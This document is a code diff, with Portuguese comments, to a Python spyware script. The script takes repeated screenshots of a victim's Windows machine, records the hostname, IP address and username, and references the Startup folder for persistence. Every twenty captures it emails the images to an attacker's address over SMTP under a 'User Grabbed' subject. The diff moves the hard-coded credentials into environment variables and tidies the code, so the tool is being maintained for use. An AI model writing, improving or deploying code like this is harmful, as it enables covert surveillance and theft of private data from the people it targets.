@@ -7,6 +7,13 @@ import shutil
 import platform
 from email.message import EmailMessage
 
+# Lê as variáveis de ambiente
+EMAIL_SENDER = os.getenv('EMAIL_SENDER')
+EMAIL_RECEIVER = os.getenv('EMAIL_RECEIVER')
+EMAIL_PASSWORD = os.getenv('EMAIL_PASSWORD')
+IMAGES_DIR = os.getenv('IMAGES_DIR', "C:\\IMAGES")  # Valor padrão se a variável não for encontrada
+SMTP_SERVER = os.getenv('SMTP_SERVER', 'smtp.gmail.com')
+SMTP_PORT = int(os.getenv('SMTP_PORT', 587))
 
 class VictimInfo:
     def __init__(self):
@@ -15,12 +22,11 @@ class VictimInfo:
         self.ip = socket.gethostbyname(self.hostname)
         self.user = os.getlogin()
         self.execution_dir = os.path.dirname(__file__)
-        self.images_dir = "C:\\IMAGES"
+        self.images_dir = IMAGES_DIR
         self.startup_dir = f'C:\\Users\\{self.user}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\'
 
     def log_info(self):
         return f"ℹ️ - LOG INFORMATION:\n\n🖥️ | Hostname: {self.hostname}\n⚙️ | System: {self.system}\n📍 | IP: {self.ip}"
-
 
 class FileManager:
     @staticmethod
@@ -38,14 +44,13 @@ class FileManager:
         except Exception as e:
             print(f"Error during copying: {e}")
 
-
 class EmailManager:
     @staticmethod
     def send_email(subject, body, images_dir):
         try:
             msg = EmailMessage()
-            msg["From"] = "emailsender"
-            msg["To"] = "emailreceiver"
+            msg["From"] = EMAIL_SENDER
+            msg["To"] = EMAIL_RECEIVER
             msg["Subject"] = subject
             msg.set_content(body)
 
@@ -54,9 +59,9 @@ class EmailManager:
                 with open(image_path, "rb") as file:
                     msg.add_attachment(file.read(), maintype='image', subtype='png', filename=image)
 
-            server = smtplib.SMTP('smtp.gmail.com', 587)
+            server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
             server.starttls()
-            server.login("email", "apppassword")
+            server.login(EMAIL_SENDER, EMAIL_PASSWORD)
             server.send_message(msg)
             server.close()
 
@@ -64,7 +69,6 @@ class EmailManager:
         except Exception as e:
             shutil.rmtree(images_dir)
             print(f"Error sending email: {e}")
-
 
 class ScreenLogger:
     def __init__(self, images_dir):
@@ -81,12 +85,11 @@ class ScreenLogger:
             self.count += 1
 
             if self.count >= 20:
-                victim_info = VictimInfo()
+                victim_info = VictimInfo()  # Corrigido a indentação
                 EmailManager.send_email(f"🕵🏻 - User Grabbed: {victim_info.hostname}", victim_info.log_info(), self.images_dir)
                 self.count = 0
 
             time.sleep(1)
-
 
 if __name__ == "__main__":
     victim_info = VictimInfo()
